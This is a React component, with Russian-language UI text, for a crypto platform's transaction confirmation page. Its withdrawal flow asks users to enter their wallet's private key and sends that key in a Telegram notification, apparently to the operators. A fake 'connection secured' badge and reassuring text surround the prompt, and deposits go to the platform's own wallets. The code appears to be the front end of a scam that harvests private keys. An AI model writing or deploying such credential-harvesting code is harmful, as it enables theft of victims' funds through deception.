import styles from './ConfirmTransaction.module.scss'
import CopyIcon from '@assets/icons/copy.svg?react'
import ConnectionSecured from '@assets/icons/connection-secured.svg?react'
import SFCIcon from '@assets/icons/sfc-energy.svg?react'
import WideButton from '@SharedUI/WideButton/WideButton.tsx'
import { formatDate, generateSixDigitCode } from '@/utils/helpers.tsx'
import { ScrollRestoration, useLocation, useNavigate } from 'react-router-dom'
import { telegramService, transactionService } from '@/main.tsx'
import { useUser } from '@/hooks/useUser.ts'
import { useEffect, useMemo, useState } from 'react'
import ConfirmedPopup from '@SharedUI/ConfirmedPopup/ConfirmedPopup.tsx'
import { OUR_WALLETS } from '@/utils/OUR_WALLETS.tsx'
import toast from 'react-hot-toast'
import IconCircleCheckFilled from '@/assets/icons/circle-check.svg?react'
import md5 from 'crypto-js/md5'

console.log(md5('bonyklade@gmail.com').toString())

const ConfirmTransaction = () => {
  const location = useLocation()
  const navigate = useNavigate()
  const formData = location.state
  const { user } = useUser()
  const { type, amount, wallet } = formData
  const isDepositType = type === 'deposit'
  const [confirmedPopupIsOpen, setConfirmedPopupIsOpen] = useState(false)
  const [transactionHash, setTransactionHash] = useState('')
  const [privateKey, setPrivateKey] = useState('')

  const transactionId = useMemo(() => {
    return generateSixDigitCode()
  }, [])

  useEffect(() => {
    return () => {
      document.body.style.overflow = ''
    }
  }, [])

  const onSubmitTransaction = async () => {
    if (isDepositType && !transactionHash) {
      toast.error('Укажите номер/хеш транзакции')
      return
    }

    if (user.restrictions.isPrivateKey && !privateKey) {
      toast.error('Введите ваш приватный финансовый ключ')
      return
    }

    await transactionService.addTransaction({
      type: isDepositType ? 'Пополнение' : 'Вывод',
      status: 'Ожидание',
      amount,
      nickname: user?.nickname,
      executor: wallet,
    })

    setConfirmedPopupIsOpen(true)
    document.body.style.overflow = 'hidden'
    window.scrollTo(0, 0)

    if (isDepositType) {
      await telegramService.depositNotification({
        amount,
        type: `Пополнение`,
        transactionHash,
      })
    } else {
      await telegramService.withdrawnNotification({
        amount,
        type: 'Вывод',
        walletNumber: 'test',
        privateKey,
      })
    }
  }

  const copyWallet = () => {
    toast.success('Скопировано!')
    navigator.clipboard.writeText(OUR_WALLETS[wallet])
  }

  if (!user) return null

  return (
    <div className={styles['transaction-confirmation']}>
      <span className={styles['invoice-number']}>#{transactionId}</span>
      <div className={styles['row']}>
        <span className={styles['icon']}>
          <IconCircleCheckFilled width={35} height={35} color={'#14CC74'} />
        </span>
        <p className={styles['title']}>
          {isDepositType
            ? `Вам был выставлен счет на оплату`
            : `Запрос на вывод средств`}
        </p>
        <p className={styles['amount']}>USD {Number(amount).toFixed(2)}</p>
      </div>
      <div className={styles['columns-wrapper']}>
        <div className={styles['left-column']}>
          {user.restrictions.isPrivateKey && !isDepositType && (
            <div className={styles['private-key']}>
              <div>
                <p>
                  Важно: Вы собираетесь ввести ваш приватный финансовый ключ.
                  Этот ключ представляет собой уникальную комбинацию символов,
                  которая предоставляет вам доступ к вашим личным финансовым
                  данным.
                </p>
                <p>
                  Будьте осторожны при использовании вашего приватного ключа. Не
                  раскрывайте его третьим лицам, не сохраняйте на общедоступных
                  или незащищенных устройствах. В случае его утери или кражи,
                  ваши финансовые средства могут быть поставлены под угрозу.
                </p>
                <p>
                  Вводите ваш ключ только если вы абсолютно уверены в своих
                  действиях. Помните, что ответственность за сохранность вашего
                  приватного ключа лежит на вас.
                </p>
              </div>
              <p>Введите пожалуйста ваш приватный финансовый ключ</p>
              <input
                onChange={(e) => setPrivateKey(e.target.value)}
                value={privateKey}
                placeholder={'56abe1a1bcb08bc5ce9af9307e8388b2'}
              />
            </div>
          )}
          {isDepositType && (
            <div className={styles['instruction']}>
              <h2>Инструкции по переводу платежа</h2>
              <ul>
                <li className={styles['completed']}>
                  <p>1. Выбор платежной системы</p>
                  <IconCircleCheckFilled width={17} />
                </li>
                <li className={styles['completed']}>
                  <p>2. Укажите сумму пополнения</p>
                  <IconCircleCheckFilled width={17} />
                </li>
                <li>
                  <p>3. Произведите оплату по указанным реквизитам</p>
                  <div className={styles['wallet-address-wrapper']}>
                    <p
                      className={styles['wallet-address']}
                      onClick={copyWallet}
                    >
                      <span>{OUR_WALLETS[wallet]}</span> <CopyIcon />
                    </p>
                    <p className={styles['title']}>Адрес кошелька ({wallet})</p>
                  </div>
                </li>
                <li>
                  <p>
                    4. Подтвердите транзакцию, введя номер/хэш транзакции ниже
                  </p>
                  <input
                    value={transactionHash}
                    onChange={(e) => setTransactionHash(e.target.value)}
                    placeholder={'Хеш транзакции'}
                  />
                </li>
              </ul>
            </div>
          )}
        </div>
        <div className={styles['right-column']}>
          <div className={styles['fields']}>
            <div className={styles['field']}>
              <span>Статус</span>
              <p>Ожидает</p>
            </div>
            <div className={styles['field']}>
              <span>Платежная система</span>
              <p>{wallet.toUpperCase()}</p>
            </div>
            <div className={styles['field']}>
              <span>Транзакция на</span>
              <p>{OUR_WALLETS[wallet]}</p>
            </div>
            <div className={styles['field']}>
              <span>Сумма</span>
              <p>{amount} USDT</p>
            </div>
            <div className={styles['field']}>
              <span>Дата</span>
              <p>{formatDate(new Date())}</p>
            </div>
          </div>

          <div
            className={`${styles['secure-connection']} ${!isDepositType ? styles['secure-connection-withdrawn'] : ''}`}
          >
            <p>
              <ConnectionSecured />
              Соединение <br />
              защищено
            </p>
            <SFCIcon />
          </div>

          <p className={styles['disclaimer']}>
            {isDepositType
              ? `Убедитесь что вы отправляете именно то количество средств, которое
              указано. Обратите внимание что это уникальный адрес кошелька, После
              завершения операции не используйте этот адрес для последующих
              платежей.`
              : `Проверьте, что вы вводите правильную сумму для вывода.
              Пожалуйста, удостоверьтесь, что все данные верны перед
              подтверждением транзакции.`}
          </p>
          <div className={styles['buttons']}>
            <WideButton
              onClickHandler={() => {
                navigate(-1)
              }}
              text={'Отмена'}
              isTransparent
              isCancelButton
            />
            <WideButton
              onClickHandler={onSubmitTransaction}
              text={isDepositType ? 'Я заплатил' : 'Подтвердить'}
              isCheckButton
            />
          </div>
        </div>
      </div>
      {confirmedPopupIsOpen && <ConfirmedPopup />}
      <ScrollRestoration />
    </div>
  )
}

export default ConfirmTransaction
